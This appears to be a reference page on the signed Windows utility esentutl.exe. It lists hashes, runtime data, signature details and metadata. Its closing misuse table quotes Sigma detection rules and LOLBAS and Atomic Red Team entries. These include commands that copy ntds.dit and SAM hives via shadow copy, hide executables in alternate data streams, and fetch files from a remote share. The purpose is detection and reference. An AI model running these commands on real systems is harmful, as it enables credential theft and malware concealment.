---
title: esentutl.exe | Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
excerpt: What is esentutl.exe?
---

# esentutl.exe 

* File Path: `C:\WINDOWS\SysWOW64\esentutl.exe`
* Description: Extensible Storage Engine Utilities for Microsoft(R) Windows(R)

## Hashes

Type | Hash
-- | --
MD5 | `D5BFB83F73604AC0D571E972D25604D7`
SHA1 | `2DB485A1219BFE5A806F9F497B661097BA99ED07`
SHA256 | `954AAA329E4225E0A83F36F96DAA5B7B418BD6207F8DF7231BA8CE75E5996CD9`
SHA384 | `5C6E9C441B2F5C8C575EAA957F7BCF3A12E9BB4BC4127AEAFC6E276DD823E8B7545ED159A39C77002367BD72986EF9DC`
SHA512 | `8B54AB3518EA3EFF0D4DAAA649BC4C10A5D0A88009778AAEE39C0379E0AD2C5625AB9316D5C2DCEC8EC1220208AA82ECA35EEF0C7ECB6E4C9FC6D099C92FBF14`
SSDEEP | `6144:UW2/ZZS+9itpvOghWPh612MAwqCgMqyY02SaXB+U5jMjArCk16imWqui2Amikbu8:SZZV9itpv9hWPZOJRTXS/EuMC`
IMP | `08A29170254C7CA52C81DD3D57316BA4`
PESHA1 | `388B171C526AB29BBF2A48943392570A65504172`
PE256 | `73C5E054276DB2FEC4A9B68B2DF3AF98B01CAF4F98EC08B554E56B770303A91E`

## Runtime Data

### Child Processes:
conhost.exe

### Open Handles:

Path | Type
-- | --
(RW-)   C:\Windows | File
(RW-)   C:\Windows\SysWOW64 | File
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
\Sessions\2\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
\Sessions\2\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section


### Loaded Modules:

Path |
-- |
C:\WINDOWS\SYSTEM32\ntdll.dll |
C:\WINDOWS\System32\wow64.dll |
C:\WINDOWS\System32\wow64base.dll |
C:\WINDOWS\System32\wow64con.dll |
C:\WINDOWS\System32\wow64cpu.dll |
C:\WINDOWS\System32\wow64win.dll |
C:\WINDOWS\SysWOW64\esentutl.exe |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: esentutl.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.1 (WinBuild.160101.0800)
* Product Version: 10.0.22000.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/72
* VirusTotal Link: https://www.virustotal.com/gui/file/954aaa329e4225e0a83f36f96daa5b7b418bd6207f8df7231ba8ce75e5996cd9/detection


## Possible Misuse

*The following table contains possible examples of `esentutl.exe` being misused. While `esentutl.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/create_remote_thread/sysmon_suspicious_remote_thread.yml) | `- '\esentutl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_esentutl_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_esentutl_activity.yml) | `title: Suspicious Esentutl Use`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_esentutl_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_esentutl_activity.yml) | `description: Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance. `{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\ntds.dit*`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\SAM`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_vssadmin_ntds_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_vssadmin_ntds_activity.yml) | `- esentutl.exe /y /vss *\SYSTEM`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_alternate_data_streams.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_alternate_data_streams.yml) | `- 'esentutl '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_susp_esentutl_params.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_susp_esentutl_params.yml) | `title: Esentutl Gather Credentials`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_susp_esentutl_params.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_susp_esentutl_params.yml) | `- 'esentutl'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_copying_sensitive_files_with_credential_data.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_copying_sensitive_files_with_credential_data.yml) | `- https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_copying_sensitive_files_with_credential_data.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_copying_sensitive_files_with_credential_data.yml) | `- Image\|endswith: '\esentutl.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `Name: Esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Command: esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Path: C:\Windows\System32\esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Path: C:\Windows\SysWOW64\esentutl.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Esentutl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml) | `- Link: https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #3: esentutl.exe SAM copy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #3: esentutl.exe SAM copy [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | - [Atomic Test #3 - esentutl.exe SAM copy](#atomic-test-3---esentutlexe-sam-copy) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | ## Atomic Test #3 - esentutl.exe SAM copy | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | Copy the SAM hive using the esentutl.exe utility | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1003.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md) | esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


